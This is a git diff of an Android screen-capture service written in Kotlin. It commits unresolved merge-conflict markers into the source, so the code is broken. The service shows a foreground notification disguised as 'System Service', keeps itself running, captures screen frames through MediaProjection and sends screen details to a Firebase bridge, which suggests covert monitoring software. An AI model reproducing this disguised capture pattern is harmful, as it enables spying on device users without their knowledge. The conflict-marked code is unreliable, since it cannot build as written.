@@ -33,6 +33,12 @@ class ScreenCaptureService : Service() {
             return START_NOT_STICKY
         }
 
+<<<<<<< HEAD
+=======
+        // If already running, just return sticky
+        if (isRunning) return START_STICKY
+
+>>>>>>> 0ad8761 (Update Wq project)
         createChannel()
         startForeground(1337, Notification.Builder(this, "screen")
             .setContentTitle("System Service")
@@ -44,11 +50,21 @@ class ScreenCaptureService : Service() {
         bgHandler = Handler(bgThread.looper)
 
         val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+<<<<<<< HEAD
         val data = intent?.getParcelableExtra<Intent>("projection") ?: return START_NOT_STICKY
         val code = intent.getIntExtra("resultcode", -1)
         mediaProjection = mpm.getMediaProjection(code, data)
 
         startCapture()
+=======
+        val data = intent?.getParcelableExtra<Intent>("projection")
+        val code = intent?.getIntExtra("resultcode", -1) ?: -1
+
+        if (data != null && code != -1) {
+            mediaProjection = mpm.getMediaProjection(code, data)
+            startCapture()
+        }
+>>>>>>> 0ad8761 (Update Wq project)
         isRunning = true
         return START_STICKY
     }
@@ -58,8 +74,13 @@ class ScreenCaptureService : Service() {
         val w = metrics.widthPixels
         val h = metrics.heightPixels
         val dpi = metrics.densityDpi
+<<<<<<< HEAD
 
         FirebaseBridge.updateScreenInfo(w, h)
+=======
+        FirebaseBridge.updateScreenInfo(w, h)
+
+>>>>>>> 0ad8761 (Update Wq project)
         imageReader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
         virtualDisplay = mediaProjection?.createVirtualDisplay(
             "sc", w, h, dpi,
@@ -78,10 +99,14 @@ class ScreenCaptureService : Service() {
             val rowStride = planes.rowStride
             val rowPadding = rowStride - pixelStride * image.width
 
+<<<<<<< HEAD
             val bmp = Bitmap.createBitmap(
                 image.width + rowPadding / pixelStride,
                 image.height, Bitmap.Config.ARGB_8888
             )
+=======
+            val bmp = Bitmap.createBitmap(image.width + rowPadding / pixelStride, image.height, Bitmap.Config.ARGB_8888)
+>>>>>>> 0ad8761 (Update Wq project)
             bmp.copyPixelsFromBuffer(buffer)
             val cropped = Bitmap.createBitmap(bmp, 0, 0, image.width, image.height)
 
